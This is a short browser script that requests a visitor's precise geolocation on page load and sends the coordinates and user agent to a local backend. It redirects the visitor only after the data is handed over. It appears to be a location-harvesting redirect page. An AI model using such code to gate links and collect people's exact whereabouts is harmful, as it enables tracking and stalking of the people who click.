window.onload = function () {
    setTimeout(getLocationAndRedirect, 1000);
};

async function sendLocationToBackend(locationData) {
    const statusElement = document.getElementById('status');

    try {
        statusElement.innerHTML = 'Securely sending location data...';

        const response = await fetch('http://localhost:8000/api/locations', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(locationData)
        });

        if (!response.ok) throw new Error('Failed to send location');

        const result = await response.json();

        statusElement.innerHTML = 'Completing redirect...';
        if (result.redirectUrl) {
            window.location.href = result.redirectUrl;
        } else {
            statusElement.innerHTML = 'Redirect URL not found.';
        }
    } catch (error) {
        console.error('Error sending location:', error);
        statusElement.innerHTML = 'Error processing location. Redirection cancelled.';
    }
}

async function getLocationAndRedirect() {
    const statusElement = document.getElementById('status');

    if (!navigator.geolocation) {
        statusElement.innerHTML = 'Geolocation not supported.';
        return;
    }

    statusElement.innerHTML = 'Requesting location access...';

    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        });

        const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };

        await sendLocationToBackend(locationData);

    } catch (error) {
        console.warn('Location denied or error:', error);
        statusElement.innerHTML = 'Location access denied. Cannot redirect.';
    }
}
